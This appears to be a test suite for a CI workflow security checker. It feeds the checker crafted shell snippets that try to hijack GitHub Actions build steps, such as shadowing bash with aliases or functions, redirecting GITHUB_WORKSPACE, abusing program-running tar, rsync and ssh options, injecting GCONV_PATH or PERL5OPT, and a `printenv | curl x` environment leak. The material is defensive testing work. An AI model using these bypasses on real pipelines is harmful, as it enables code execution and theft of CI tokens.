kc ws_bad63 "n=\$(tr -d '\$' <<'E.'\n\$GITHUB_WORKSPACE\nE.\n)\nprintf -v \"\$n\" '%s' /tmp/evil\nbash \"\$GITHUB_WORKSPACE/bin/build-apk.sh\"" 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad64 "n=\$(tr -d '\$' <<\"E-1\"\n\$GITHUB_WORKSPACE\nE-1\n)\nread -r \"\$n\" <<< /tmp/evil\nbash \"\$GITHUB_WORKSPACE/bin/build-apk.sh\"" 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad65 "(:)# '\nv=\$(echo '\$GITHUB_WORKSPACE'|cut -c2-)\n(:)# '\nexport \"\$v=\$PWD/evil\"\nbash \"\$GITHUB_WORKSPACE/bin/build-apk.sh\"" 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad67 'eval "true"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash","eval"]' '["bin/build-apk.sh"]'
kc ws_bad68 'declare -n r=x\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad69 'typeset -n r=x\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad70 'echo "${!n}"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad71 'printf -v v %s x\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad72 'source "$f"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad73 '. "$f"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad74 '[[ $$GITHUB_WORKSPACE =~ ([A-Z_]+)$ ]]\nexport "${BASH_REMATCH[1]}=/evil"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad75 'for n in $(compgen -e | grep GITHUB_W); do export $n=/e; done\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad76 'for n in $(compgen -e); do case $n in GITHUB_W*) export $n=/e;; esac; done\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad77 'declare -x "$(compgen -e | grep -m1 GITHUB_W)=/e"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad78 'export "$1=/e"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad79 'export "$@"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad80 'export $*\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad81 'declare -x "$1"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad82 'let "$1=3"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad83 'unset -v "$1"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad84 '"$1"=x\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad85 'read -a "$1"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad86 'read -r "${n}" <<< x\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad87 "shopt -s expand_aliases\nalias bash='bash ./hijack'\nbash \"\$GITHUB_WORKSPACE/bin/build-apk.sh\"" 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad88 'for v in $(compgen -e); do val=$(printenv "$v"); case "$val" in *:*) ;; *) export "$v=/tmp/evil";; esac; done\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad89 'hash -p /tmp/evil bash\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad90 'function bash { echo hi; }\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad91 'function bash() { echo hi; }\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad92 'y=$(cat cfg)\nexport \\\n  "$y"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad93 'read -r v < cfg\n: $(( v ))\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad94 'read -r v < cfg\n(( v ))\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad95 'a=(1 2)\n: "${a[v]}"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad96 'sleep 0 & wait -p "$y"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad97 'export ""$y\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad98 'b=/evil/sh\n$b "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad99 'bash=/evil\n"$bash" "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad100 'BASH_CMDS["bash"]=/tmp/evx\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad101 "BASH_CMDS=([\"bash\"]=/tmp/evx)\nbash \"\$GITHUB_WORKSPACE/bin/build-apk.sh\"" 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad102 'enable -f /path/lb.so bash\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad103 'export `echo github_workspace=/x | tr a-z A-Z`\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad104 'unset `echo github_workspace | tr a-z A-Z`\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad105 'declare "`echo github_workspace=/x | tr a-z A-Z`"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad106 'declare -u y=ithub_workspace\nexport G"$y"=/tmp/evil\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad107 'f() { local -u y=ithub_workspace; export G"$y"=/tmp/evil; }\nf\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad108 'y=ithub_workspace\nread -r G"$y" <<< /tmp/evil\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
ko ws_ok8 'export FOO="$HOME/x"\nread -r line <<< "$FOO"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' '["bash"]' '["bin/build-apk.sh"]'
ko ws_ok7 "x=\"\$(echo \"\$GITHUB_WORKSPACE\")\"\nbash \"\$GITHUB_WORKSPACE/bin/build-apk.sh\"" '["bash"]' '["bin/build-apk.sh"]'
ko ws_ok6 "cat <<'E'\nit's text\nE\nbash \"\$GITHUB_WORKSPACE/bin/build-apk.sh\"" '["bash"]' '["bin/build-apk.sh"]'
ko ws_ok5 "echo 'it is fine' # the helper's path\nbash \"\$GITHUB_WORKSPACE/bin/build-apk.sh\"" '["bash"]' '["bin/build-apk.sh"]'
d=$(cfix ws_bad48 'bash "$GITHUB_WORKSPACE/bin/build-apk.sh"' '["bash"]' '["bin/build-apk.sh"]'); setfile "$d" bin/c.sh "#!/usr/bin/env -S GITHUB_WORKSPACE=/tmp/x bash\nset -euo pipefail\nbash \"\$GITHUB_WORKSPACE/bin/build-apk.sh\"\n"; expm caught "$d" 'GITHUB_WORKSPACE' "round-5 ws_bad48: the first line is read too: an env -S assignment of the variable is refused"
ko r5_ok2 '2>&1 cp x y'
ko r5_ok3 'echo a > out; cat out'
# (6) the reviewed text starts at the first assignment or redirection of the simple command
d=$(wfix t6_a 'GCONV_PATH=/x PERL5OPT=-Mevil exec bash "$@"\n'); edit_spec "$d" 'rows["bin/witnessed.sh"]["tools"].append("exec"); rows["bin/witnessed.sh"]["exceptions"].append({"rule":"launcher","text":"exec bash \"$@\"","why":"x"})'; expm caught "$d" 'launches another program' "round-2 (6): assignments before exec bash \"\$@\" are not waived by the plain entry"
d=$(wfix t6_b '>o exec bash "$@"\n'); edit_spec "$d" 'rows["bin/witnessed.sh"]["tools"].append("exec"); rows["bin/witnessed.sh"]["exceptions"].append({"rule":"launcher","text":"exec bash \"$@\"","why":"x"})'; expm caught "$d" 'launches another program' "round-2 (6): a leading redirection is not waived by the plain entry"
d=$(wfix t6_c 'GCONV_PATH=/x exec bash "$@"\n'); edit_spec "$d" 'rows["bin/witnessed.sh"]["tools"].append("exec"); rows["bin/witnessed.sh"]["exceptions"].append({"rule":"launcher","text":"GCONV_PATH=/x exec bash \"$@\"","why":"x"})'; expm ok "$d" - "round-2 (6): the entry with the assignment included waives that command"
d=$(wfix t6_d 'exec bash "$@"\n'); edit_spec "$d" 'rows["bin/witnessed.sh"]["tools"].append("exec"); rows["bin/witnessed.sh"]["exceptions"].append({"rule":"launcher","text":"exec bash \"$@\"","why":"x"})'; expm ok "$d" - "round-2 (6): the plain entry still waives the plain command"
# (7) ambient: the original value, and wrappers must be authorized too
for v in "' \${{ github.token }}'" "'\${{ github.token }} '" '"\t${{ github.token }}"' '"${{ github.token }}\n"' '"${{ github.token }}\r"'; do
  d=$(afix "v7_$RANDOM"); printf 'jobs:\n  j:\n    steps:\n      - name: apk\n        env:\n          GH_TOKEN: %s\n        run: bash bin/witnessed.sh apk bin/stage-apk.sh\n' "$v" > "$d/.github/workflows/stage-verify.yml"; expm caught "$d" 'plain expression' "round-2 (7): the ambient value $v (surrounding whitespace) is not a plain expression"
done
d=$(afix w7_a); printf '[{"name":"GH_TOKEN","script":"bin/build-admit.py","why":"x"}]' > "$d/.ambient.json"; gen "$d"; expm caught "$d" 'not authorized' "round-2 (7): GH_TOKEN authorized only for bin/build-admit.py is refused when the step also runs a wrapper (bin/witnessed.sh) and a stage script"
d=$(afix w7_b); printf '[{"name":"GH_TOKEN","script":"bin/build-admit.py","why":"x"},{"name":"GH_TOKEN","script":"bin/witnessed.sh","why":"x"}]' > "$d/.ambient.json"; gen "$d"; expm caught "$d" 'not authorized' "round-2 (7): the stage script bin/stage-apk.sh named as an argument must be authorized too"
d=$(afix w7_c); expm ok "$d" - "round-2 (7): authorized for the wrapper, the stage script and the reader is admitted"
# (8) closed-list gaps
kc s8_a 'install --strip-program dist/sed a b' 'by a path'
kc s8_b 'tar -I dist/sed -cf x y' 'by a path' '["tar"]'
kc s8_c 'tar --to-command dist/sed -xf a' 'by a path' '["tar"]'
kc s8_d 'tar --checkpoint-action=exec=dist/sed -cf x y' 'by a path' '["tar"]'
kc s8_e 'tar --rsh-command dist/sed -cf x y' 'by a path' '["tar"]'
kc s8_f 'sort --compress-program dist/sed f' 'by a path'
ko s8_ok1 'cp --reflink=auto x archive/go'
ko s8_ok2 'cp x archive/*'
kc s8_g 'dist/s?d x' 'by a path'
kc s8_h 'dist/[s]ed x' 'by a path'
kc s8_i '/usr/bin/s?d x' 'by a path'
kc s8_j 'dist/\sed x' 'by a path'
kc s8_k "\$'dist/sed' x" 'by a path'
kc s8_l 'dist/"sed" x' 'by a path'
kc s8_m "trap 'dist/s?d' EXIT" 'by a path' '["trap"]'
kc s8_n 'python3.11 -c x' 'python3.11'
kc s8_o '/usr/bin/python3.11 -c x' 'python3.11'
kc s8_p '/usr/bin/perl5.38 -e x' 'perl5.38'
kc s8_q 'rbash -c x' 'rbash'
kc s8_r 'gsed e' 'gsed'
kc s8_s 'lua5.3 x' 'lua5.3'
kc s8_t 'vi -c :!id' 'vi'
kc s8_u 'ex' 'ex'
kc s8_v 'nodejs x.js' 'nodejs'
kc s8_w 'ash -c x' 'ash'
ko s8_ok3 'python3.11 bin/build-apk.sh' '["python3.11"]' '["bin/build-apk.sh"]'
# (9) one left-to-right quote pass; an unterminated quote or brace leaves the rest of the line unmasked
kc a9_a 'echo "it'"'"'s"; dist/sed p; echo '"'"'x'"'"'' 'by a path'
kc a9_b 'echo "it'"'"'s"; bash -c "$X"; echo '"'"'x'"'"'' 'handed' '["bash"]'
kc a9_c "x='\n'; setsid x" 'launches another program'
kc a9_d "echo 'foo\nbar'; setsid x" 'launches another program'
kc a9_e 'echo "foo\nbar"; setsid x' 'launches another program'
kc a9_f "echo it's; setsid x" 'launches another program'
kc a9_g 'echo "unterminated; setsid x' 'launches another program'
kc a9_h "echo \$'a\\\\'b'; setsid x" 'launches another program'
kc a9_i 'echo ${X:-"}"}; setsid x' 'launches another program'
kc a9_j 'echo "$(echo ")")"; setsid x' 'launches another program'
kc a9_k 'echo "$(echo "(")"; setsid x' 'launches another program'
kc a9_l 'echo "${X:-$(setsid y)}"' 'launches another program'
kc a9_m 'echo "`setsid y`"' 'launches another program'
ko a9_ok1 'echo "it'"'"'s fine"; cp x y'
ko a9_ok2 "echo 'a \"b\" c'; cp x y"
ko a9_ok3 'echo "$(echo ")")"'
ko a9_ok4 'echo ${X:-"}"}'
ko a9_ok5 'echo "multi\nline"; cp x y'


# ---- PR 1b round 3
# (1) quote-only literal words are normalized before the path rules, arg_words and reach
for form in '"bin/evil.sh"' "'bin/evil.sh'" "bi'n/evil.sh'" 'bin/"evil.sh"' '"bin/"evil.sh'; do
  aw "t1a_$RANDOM" "bash bin/witnessed.sh apk $form" caught 'evil.sh'
  aw "t1b_$RANDOM" "bash bin/witnessed.sh apk bin/stage-apk.sh $form" caught 'evil.sh'
  aw "t1c_$RANDOM" "bash bin/witnessed.sh $form bin/stage-apk.sh" caught 'arg_words'
done
aw t1a_x 'bash bin/witnessed.sh apk "$X"' caught '$X'
aw t1b_x 'bash bin/witnessed.sh apk bin/stage-apk.sh "$X"' caught '$X'
aw t1c_x 'bash bin/witnessed.sh "$X" bin/stage-apk.sh' caught 'arg_words'
d=$(awfix t1_reach); printf '[{"name":"GH_TOKEN","script":"bin/witnessed.sh","why":"x"},{"name":"GH_TOKEN","script":"bin/build-admit.py","why":"x"}]' > "$d/.ambient.json"; printf 'jobs:\n  j:\n    steps:\n      - name: apk\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh apk "bin/stage-apk.sh"\n' > "$d/.github/workflows/stage-verify.yml"; gen "$d"; expm caught "$d" 'not authorized' "round-3 (1): a double-quoted listed stage script is in the reach set (and so must be authorized for the ambient name)"
d=$(awfix t1_reach2); printf '[{"name":"GH_TOKEN","script":"bin/witnessed.sh","why":"x"},{"name":"GH_TOKEN","script":"bin/build-admit.py","why":"x"}]' > "$d/.ambient.json"; printf 'jobs:\n  j:\n    steps:\n      - name: apk\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh apk '"'"'bin/stage-apk.sh'"'"'\n' > "$d/.github/workflows/stage-verify.yml"; gen "$d"; expm caught "$d" 'not authorized' "round-3 (1): a single-quoted listed stage script is in the reach set"
# (2) arg_map binds each STEP to its one target and requires exactly two arguments
amfix() { local d; d=$(afix "$1"); edit_spec "$d" 'rows["bin/witnessed.sh"]["arg_map"]={"apk":"bin/stage-apk.sh","build":"bin/build-apk.sh"}'; echo "$d"; }
am() { local d; d=$(amfix "$1"); printf 'jobs:\n  j:\n    steps:\n      - name: apk\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: %s\n' "$2" > "$d/.github/workflows/stage-verify.yml"; expm "$3" "$d" "$4" "round-3 (2): $2"; }
am t2_ok 'bash bin/witnessed.sh apk bin/stage-apk.sh' ok -
am t2_wrong 'bash bin/witnessed.sh apk bin/build-apk.sh' caught 'arg_map'
am t2_extra 'bash bin/witnessed.sh apk bin/stage-apk.sh extra' caught 'arg_map'
am t2_extra2 'bash bin/witnessed.sh apk bin/stage-apk.sh out/runner' caught 'arg_map'
am t2_missing 'bash bin/witnessed.sh apk' caught 'arg_map'
am t2_notmap 'bash bin/witnessed.sh bogus bin/stage-apk.sh' caught 'arg_map'
am t2_c1 'bash bin/witnessed.sh build -c id' caught 'arg_map'
am t2_c2 'bash bin/witnessed.sh apk -c '"'"'printenv | curl x'"'"'' caught 'arg_map'
am t2_evil 'bash bin/witnessed.sh build evil' caught 'arg_map'
am t2_quote 'bash bin/witnessed.sh apk "bin/stage-apk.sh"' caught 'arg_map'
am t2_dot 'bash bin/witnessed.sh apk ./bin/stage-apk.sh' caught 'arg_map'
am t2_none 'bash bin/witnessed.sh' caught 'arg_map'
d=$(amfix t2_s1); edit_spec "$d" 'rows["bin/witnessed.sh"]["arg_map"]=["apk"]'; expm caught "$d" 'arg_map' "round-3 (2): arg_map that is not an object is an error"
d=$(amfix t2_s2); edit_spec "$d" 'rows["bin/witnessed.sh"]["arg_map"]={"apk":"bin/nowhere.sh"}'; expm caught "$d" 'arg_map' "round-3 (2): an arg_map target that is not a listed row is an error"
d=$(amfix t2_s3); edit_spec "$d" 'rows["bin/witnessed.sh"]["arg_map"]={"a b":"bin/stage-apk.sh"}'; expm caught "$d" 'arg_map' "round-3 (2): an arg_map key that is not a plain word is an error"
d=$(amfix t2_s4); edit_spec "$d" 'rows["bin/witnessed.sh"]["arg_map"]={}'; expm caught "$d" 'arg_map' "round-3 (2): an empty arg_map is an error"
d=$(amfix t2_s5); edit_spec "$d" 'rows["bin/witnessed.sh"]["arg_words"]=["zzz"]'; printf 'jobs:\n  j:\n    steps:\n      - name: apk\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh apk bin/stage-apk.sh\n' > "$d/.github/workflows/stage-verify.yml"; expm ok "$d" - "round-3 (2): a row with arg_map uses arg_map (arg_words is ignored)"
# (3) program-running options are refused as options
tr3() { local d; d=$(cfix "$1" "$2" "${4:-[\"tar\"]}"); expm caught "$d" 'program-running option' "round-3 (3): $2 is refused"; }
tr3 t3_a 'tar --to-command=vi -xf a.tar'
tr3 t3_b 'tar -I/bin/sh -cf x y'
tr3 t3_c 'tar -xIf /opt/zz/python3 a'
tr3 t3_d 'tar -cMF /opt/zz/python3'
tr3 t3_e 'tar -M --info-script=x -cf a b'
tr3 t3_f 'tar --new-volume-script=x -cf a b'
tr3 t3_g 'tar --use-compress-program=ash -cf a b'
tr3 t3_h 'tar --checkpoint-action=exec=sh -cf a b'
tr3 t3_i 'tar -F x -cf a b'
tr3 t3_j 'tar --to-comm=vi -xf a'
tr3 t3_k 'tar xIf /opt/zz/python3 a'
tr3 t3_l 'sort --compress-program=ash f' '' '["sort"]'
tr3 t3_m 'install --strip-program=ash a b' '' '["install"]'
tr3 t3_n 'find . -exec x {} +' '' '["find"]'
tr3 t3_o 'rsync -e ssh a b' '' '["rsync"]'
tr3 t3_p 'rsync -avze ssh a b' '' '["rsync"]'
tr3 t3_q 'ssh -o ProxyCommand=x h' '' '["ssh"]'
tr3 t3_r 'git -c core.sshCommand=x fetch' '' '["git"]'
tr3 t3_s 'make x' '' '["make"]'
d=$(cfix t3_ok1 'tar -xzf "$tmp/X.tgz" -C "$tmp" NAME' '["tar"]'); expm ok "$d" - "round-3 (3): control: tar -xzf \"\$tmp/X.tgz\" -C \"\$tmp\" NAME is admitted"
d=$(cfix t3_ok2 'tar -cf x archive/go' '["tar"]'); expm ok "$d" - "round-3 (3): control: tar -cf x archive/go is admitted"
d=$(cfix t3_ok3 'tar --checkpoint=100 -cf x y' '["tar"]'); expm ok "$d" - "round-3 (3): control: tar --checkpoint=100 (no action) is admitted"
d=$(cfix t3_x1 'tar --to-command=vi -xf a.tar' '["tar"]'); edit_spec "$d" "$DEF"'rows["bin/c.sh"]["exceptions"]=[D("tar --to-command=vi -xf a.tar")]'; expm ok "$d" - "round-3 (3): a deny exception with the exact whole command waives the option"
d=$(cfix t3_x2 'tar --to-command=vi -xf a.tar b' '["tar"]'); edit_spec "$d" "$DEF"'rows["bin/c.sh"]["exceptions"]=[D("tar --to-command=vi -xf a.tar")]'; expm caught "$d" 'program-running option' "round-3 (3): the same entry does not waive a changed tail"
# (4) the ambient handoff: unset before any other child runs
d=$(afix u4_file); python3 - "$d" <<'PY'
import json, sys
d = sys.argv[1]; a = json.load(open(d + "/.ambient.json"))
for e in a: e["file"] = ".github/workflows/stage-verify.yml"; e["job"] = "j"
json.dump(a, open(d + "/.ambient.json", "w"))
PY
gen "$d"; expm ok "$d" - "round-3 (4): control: ambient entries bound to the right file and job are admitted"
d=$(afix u4_job); python3 - "$d" <<'PY'
import json, sys
d = sys.argv[1]; a = json.load(open(d + "/.ambient.json"))
for e in a: e["file"] = ".github/workflows/stage-verify.yml"; e["job"] = "other"
json.dump(a, open(d + "/.ambient.json", "w"))
PY
gen "$d"; expm caught "$d" 'bound to' "round-3 (4): a step in another job than the entry's is refused"
d=$(afix u4_file2); python3 - "$d" <<'PY'
import json, sys
d = sys.argv[1]; a = json.load(open(d + "/.ambient.json"))
for e in a: e["file"] = ".github/workflows/stage-build.yml"; e["job"] = "j"
json.dump(a, open(d + "/.ambient.json", "w"))
PY
gen "$d"; expm caught "$d" 'bound to' "round-3 (4): a step in another file than the entry's is refused"
d=$(afix u4_file3); python3 - "$d" <<'PY'
import json, sys
d = sys.argv[1]; a = json.load(open(d + "/.ambient.json"))
for e in a: e["file"] = "x"
json.dump(a, open(d + "/.ambient.json", "w"))
PY
gen "$d"; expm caught "$d" 'ambient_env' "round-3 (4): a file that is not a stage file path is an error"
# (5) the pinned step is EXACTLY the ratified one
d=$(pfix v5_noname); python3 - "$d" <<'PY'
import sys
p = sys.argv[1] + "/.github/workflows/stage-build.yml"; t = open(p).read().replace("        name: expose digests.json as the stage output\n", ""); open(p, "w").write(t)
PY
expm caught "$d" 'pinned' "round-3 (5): a pinned step without a name is refused (exactly name, id and run)"
d=$(pfx v5_name 'echo "other=$(jq -c . digests.json)" >> "$GITHUB_OUTPUT"'); expm caught "$d" 'pinned_steps' "round-3 (5): another NAME is an entry error"
d=$(pfx v5_file 'echo "digests=$(jq -c . out.json)" >> "$GITHUB_OUTPUT"'); expm caught "$d" 'pinned_steps' "round-3 (5): another FILE is an entry error"
d=$(pfix v5_job); python3 - "$d" <<'PY'
import json, sys
p = sys.argv[1] + "/.pinned.json"; j = json.load(open(p)); j[0]["job"] = "apk"; json.dump(j, open(p, "w"))
PY
gen "$d"; expm caught "$d" 'pinned_steps' "round-3 (5): another job is an entry error"
# (6) backticks
bt() { kc "$1" "$2" 'launches another program' ; }
bt b6_a 'echo `setsid`'
bt b6_b 'x=`setsid`'
bt b6_c 'echo "`stdbuf`"'
bt b6_d 'echo `true; setsid`'
kc b6_e 'echo `openssl s_client`' 'evaluator'
kc b6_f 'cat `/opt/zz/python3`' 'by a path'
kc b6_g 'echo `echo \`setsid\``' 'launches another program'
ko b6_ok 'echo `cp a b`'
# (7) function and coproc bodies
bt f7_a 'function f { setsid x; }'
bt f7_b 'coproc P { setsid x; }'
bt f7_c 'function f() { setsid x; }'
kc f7_d 'function f { bash -c id; }' 'handed' '["bash"]'
bt f7_e 'select x in a; do setsid y; done'
bt f7_f 'f() { setsid x; }'
ko f7_ok 'function f { cp a b; }'
# (8) line handling
kc l8_a 'echo a\ # ; setsid RAN' 'launches another program'
kc l8_b 'echo "x\"  # " ; setsid RAN' 'launches another program'
kc l8_c 'echo a \\\\\nsetsid RAN' 'launches another program'
ko l8_ok 'echo a # a real comment ; setsid x'
ko l8_ok2 'echo a \\\nb'
# (10) more names outside the forbidden class
for nm in JDK_JAVA_OPTIONS MAKEFLAGS GOROOT GOCACHEPROG LESSOPEN OPENSSL_CONF ACTIONS_RUNTIME_TOKEN ACTIONS_ID_TOKEN_REQUEST_URL; do
  d=$(mk "y_$nm"); printf 'jobs:\n  j:\n    steps:\n      - name: a\n        env:\n          %s: x\n        run: bash bin/build-stage.sh apk "$%s"\n' "$nm" "$nm" > "$d/.github/workflows/stage-verify.yml"; expm caught "$d" 'never allowed' "round-3 (10): the env name $nm is forbidden in a step env"
  d=$(mk "z_$nm"); printf '["DIGESTS","%s"]' "$nm" > "$d/.envnames.json"; gen "$d"; expm caught "$d" 'env_names' "round-3 (10): $nm in env_names is refused"
done
d=$(afix y_ghtoken2); expm ok "$d" - "round-3 (10): control: GH_TOKEN stays allowed"


# ---- PR 1b round 4
# (4) file and job are REQUIRED on every ambient_env entry
d=$(afix g4_a); AMBIENT_RAW=1 gen "$d"; expm caught "$d" 'ambient_env' "round-4 (4): an ambient_env entry without file and job is an entry error"
d=$(afix g4_b); python3 - "$d" <<'PY'
import json, sys
p = sys.argv[1] + "/.ambient.json"; a = json.load(open(p))
for e in a: e["file"] = ".github/workflows/stage-verify.yml"
json.dump(a, open(p, "w"))
PY
AMBIENT_RAW=1 gen "$d"; expm caught "$d" 'ambient_env' "round-4 (4): an entry with a file but no job is an entry error"
# (B) handoff_line: ONE exact source line, once, outside comments
hl() { # hl NAME 'stage-apk.sh body' HANDOFF-LINE-JSON ok|caught FRAG
  local d; d=$(afix "$1"); setfile "$d" bin/stage-apk.sh "#!/usr/bin/env bash\nset -euo pipefail\n$2\n"
  python3 - "$d" "$3" <<'PY'
import json, sys
d = sys.argv[1]; a = json.load(open(d + "/.ambient.json"))
for e in a:
    if e["script"] == "bin/stage-apk.sh": e["handoff_line"] = json.loads(sys.argv[2])
json.dump(a, open(d + "/.ambient.json", "w"))
PY
  gen "$d"; echo "$d"; }
d=$(hl h_ok 'python3 bin/build-admit.py run\nunset GH_TOKEN' '"unset GH_TOKEN"'); expm ok "$d" - "round-4 (B): the handoff line present once is admitted"
d=$(hl h_miss 'python3 bin/build-admit.py run' '"unset GH_TOKEN"'); expm caught "$d" 'handoff_line' "round-4 (B): a required line that is missing is an error"
d=$(hl h_cmt 'python3 bin/build-admit.py run\n# unset GH_TOKEN' '"unset GH_TOKEN"'); expm caught "$d" 'handoff_line' "round-4 (B): a required line present only in a comment is an error"
d=$(hl h_cmt2 'python3 bin/build-admit.py run\necho a # unset GH_TOKEN' '"unset GH_TOKEN"'); expm caught "$d" 'handoff_line' "round-4 (B): a trailing comment is not the line"
d=$(hl h_twice 'unset GH_TOKEN\npython3 bin/build-admit.py run\nunset GH_TOKEN' '"unset GH_TOKEN"'); expm caught "$d" 'handoff_line' "round-4 (B): a required line present twice is an error"
d=$(hl h_num 'unset GH_TOKEN' '5'); expm caught "$d" 'ambient_env' "round-4 (B): a handoff_line that is not a string is an error"
d=$(hl h_nl 'unset GH_TOKEN' '"unset GH_TOKEN\nx"'); expm caught "$d" 'ambient_env' "round-4 (B): a multi-line handoff_line is an error"
d=$(hl h_ctl 'unset GH_TOKEN' '"unset\u0001GH_TOKEN"'); expm caught "$d" 'ambient_env' "round-4 (B): a handoff_line with a control character is an error"
d=$(hl h_blank 'python3 bin/build-admit.py run\nunset GH_TOKEN\nunset GH_TOKEN' '""'); expm ok "$d" - "round-4 (B): a blank handoff_line is no requirement"
d=$(hl h_stale 'python3 bin/build-admit.py run\nunset GH_TOKEN' '"unset GH_TOKEN"'); printf 'echo extra\n' >> "$d/bin/stage-apk.sh"; expm caught "$d" 'sha256' "round-4 (B): a script edited with the old sha256 kept in its row is refused on the hash pin"
# (6) the wrapper tuple needs bash
am g6_ok 'bash bin/witnessed.sh apk bin/stage-apk.sh' ok -
